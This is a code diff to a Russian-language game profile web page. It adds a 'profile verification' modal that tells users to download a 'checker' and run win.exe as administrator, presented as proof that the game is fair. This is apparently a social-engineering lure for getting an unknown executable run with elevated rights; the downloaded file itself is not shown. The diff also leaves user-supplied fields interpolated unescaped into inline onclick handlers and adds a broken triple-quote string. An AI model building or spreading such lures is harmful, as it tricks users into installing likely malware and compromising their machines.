@@ -665,6 +665,31 @@
         </div>
     </div>
 
+    <!-- Модалка для инструкции по верификации -->
+    <div id="verifyModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>🛡️ Проверка анкеты</h2>
+                <button class="modal-close" onclick="closeVerifyModal()">×</button>
+            </div>
+            <p>Чтобы подтвердить честность игры, скачайте чекер и выполните следующие шаги:</p>
+            <ol style="margin: 15px 0 15px 20px; color: #c5c6c7;">
+                <li>Скачайте <strong>чекер</strong> по кнопке ниже.</li>
+                <li>Запустите файл <code>win.exe</code> <strong>от имени администратора</strong>.</li>
+                <li>Введите <strong>ID анкеты</strong>: <span id="verifyProfileIdSpan" style="color:#66fcf1; font-weight:bold;">---</span> и нажмите «Проверить».</li>
+                <li>Дождитесь завершения анализа (обычно 10–30 секунд).</li>
+                <li>Результат автоматически появится в вашем профиле.</li>
+            </ol>
+            <div class="instruction-code">
+                🔑 ID анкеты: <strong id="verifyProfileIdSpan2">---</strong>
+            </div>
+            <div style="display: flex; gap: 10px; margin-top: 15px;">
+                <button class="btn btn-primary" onclick="downloadChecker()">⬇️ Скачать чекер</button>
+                <button class="btn btn-primary" onclick="closeVerifyModal()">Закрыть</button>
+            </div>
+        </div>
+    </div>
+
     <script>
         // ===== ДАННЫЕ =====
         const gameData = {
@@ -983,7 +1008,7 @@
             let actions = '';
             if (isOwn) {
                 actions = `
-                    <button class="btn btn-primary" onclick="openEditModal(${item.id}, '${item.name}', '${item.description}', '${item.rank}')">✏️ Редактировать</button>
+                    <button class="btn btn-primary" onclick="openEditModal(${item.id}, '${item.name}', '''${item.description}''', '${item.rank}')">✏️ Редактировать</button>
                     <button class="btn btn-primary" onclick="openVerifyModal(${item.id})">🛡️ Проверить</button>
                     <button class="btn btn-danger" onclick="deleteProfile(${item.id})">🗑️ Удалить</button>
                 `;
